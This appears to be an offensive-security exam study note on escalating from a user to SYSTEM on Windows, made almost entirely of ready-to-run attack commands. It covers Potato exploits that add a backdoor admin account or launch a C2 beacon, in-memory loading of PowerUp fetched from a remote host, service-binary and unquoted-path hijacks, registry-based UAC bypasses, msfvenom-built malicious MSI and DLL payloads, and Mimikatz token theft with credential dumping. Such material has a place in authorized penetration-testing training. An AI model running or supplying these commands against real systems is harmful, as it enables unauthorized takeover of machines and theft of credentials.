# Phase 05: Windows Privilege Escalation

> Getting from domain user / local user → SYSTEM on a workstation or server.

---

## Fastest Paths (Try in This Order)

### 1. SeImpersonatePrivilege → Potato Attack (Most Common)

If `SeImpersonatePrivilege` is enabled (common on service accounts, IIS, MSSQL):

```bash
# GodPotato — works on Windows Server 2012–2022, Win 10/11
# Download: https://github.com/BeichenDream/GodPotato
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ss123 /add & net localgroup administrators hacker /add"

# Or: run your beacon as SYSTEM
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\beacon.exe"

# SweetPotato — alternative for older Windows versions
.\SweetPotato.exe -a "whoami"
.\SweetPotato.exe -e EfsRpc -p C:\Windows\Temp\beacon.exe

# PrintSpoofer — specific to Windows 10 / Server 2016-2019
.\PrintSpoofer.exe -i -c cmd
.\PrintSpoofer.exe -c "C:\Windows\Temp\beacon.exe"
```

**Exam tip**: GodPotato works on the widest range of Windows versions. Try it first.

---

### 2. Weak Service Permissions

```powershell
# PowerUp — automated check
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerUp.ps1')
Invoke-AllChecks

# Manual: find services with weak binary ACLs
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName.Split('"')[1]
    if ($path) {
        $acl = Get-Acl $path -ErrorAction SilentlyContinue
        if ($acl) { $acl | Select -Expand Access | Where-Object { $_.FileSystemRights -match "Write|Modify|FullControl" } }
    }
}

# If you find a writable service binary — replace it:
copy C:\Windows\Temp\beacon.exe "C:\Program Files\VulnService\service.exe"
sc stop VulnService
sc start VulnService
# Service starts your beacon as SYSTEM
```

---

### 3. Unquoted Service Path

```powershell
# Find unquoted paths with spaces
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -match ' '} |
  Select Name, PathName, StartName

# Example path: C:\Program Files\Vuln App\service.exe
# Drop your binary as: C:\Program Files\Vuln.exe
# Service loader tries each path segment before finding the real one
copy C:\Windows\Temp\beacon.exe "C:\Program Files\Vuln.exe"
sc stop VulnSvc; sc start VulnSvc
```

---

### 4. UAC Bypass (When Already Local Admin But Medium Integrity)

```powershell
# Check integrity level
whoami /groups | findstr "Mandatory Label"
# Medium Mandatory Label = UAC applies even though you're "admin"

# Method 1: FodHelper (reliable on Win 10)
$path = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
New-Item -Path $path -Force
New-ItemProperty -Path $path -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path $path -Name "(default)" -Value "C:\Windows\Temp\beacon.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Method 2: Eventvwr
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" "(Default)" "C:\Windows\Temp\beacon.exe"
Start-Process "C:\Windows\System32\eventvwr.exe" -WindowStyle Hidden

# Method 3: CMSTP (bypass + code execution)
# Method 4: via Sliver — built-in UAC bypass modules
sliver (beacon) > uac-bypass --type fodhelper -c "C:\Windows\Temp\beacon_high.exe"
```

---

### 5. AlwaysInstallElevated

```powershell
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Both must be 1 for this to work

# Create malicious MSI (msfvenom)
msfvenom -p windows/x64/exec CMD='net user hacker P@ss123! /add' -f msi > evil.msi

# Execute — runs as SYSTEM due to AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi
```

---

### 6. DLL Hijacking

```powershell
# Find processes loading non-existent DLLs (use Procmon on lab — note common patterns)
# Common vulnerable apps: various 3rd party software in Program Files

# Check write perms in directories where DLLs are loaded from
icacls "C:\Program Files\VulnApp\" | findstr "Everyone\|BUILTIN\|Users"

# Drop malicious DLL
# DLL must export the expected functions — use a proxy DLL:
msfvenom -p windows/x64/exec CMD='C:\Windows\Temp\beacon.exe' -f dll > vuln.dll
copy vuln.dll "C:\Program Files\VulnApp\missing.dll"
# Restart the application / wait for it to restart
```

---

### 7. Token Impersonation

```powershell
# If you have a high-priv token available (e.g., another user's process)
# Mimikatz in-memory (via execute-assembly):
privilege::debug
token::elevate          # steal SYSTEM token
sekurlsa::logonpasswords
token::revert

# Incognito (list + impersonate tokens)
sliver (beacon) > execute-assembly /tools/Incognito.exe list_tokens -u
sliver (beacon) > execute-assembly /tools/Incognito.exe execute_token "NT AUTHORITY\SYSTEM" cmd.exe
```

---

### 8. Named Pipe Impersonation

```powershell
# If a high-priv service connects to a named pipe you control:
# Tools: PipeServer (custom), SharpPipes

# Simple PowerShell pipe server waiting for SYSTEM connection
$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('mypipe', 'InOut', 1, 'Byte', 'None', 65536, 65536)
$pipe.WaitForConnection()
$pipe.RunAsClient({
    whoami | Out-File C:\Windows\Temp\pipeid.txt
})
```

---

## Confirm SYSTEM

```powershell
# Verify elevated shell
whoami
# NT AUTHORITY\SYSTEM  ← success

# From C2
sliver (beacon) > getuid
# [*] Process owner: NT AUTHORITY\SYSTEM
```

---

## Exam Tip

Don't spend more than 15 minutes on any single privesc technique. If Potato doesn't work after 10 minutes, move to service permissions. Keep trying different methods in parallel — winPEAS will usually highlight the right path.

---

## Next Step

SYSTEM achieved → **Phase 06: Credential Access & Replay** (`06-credential-access.md`)
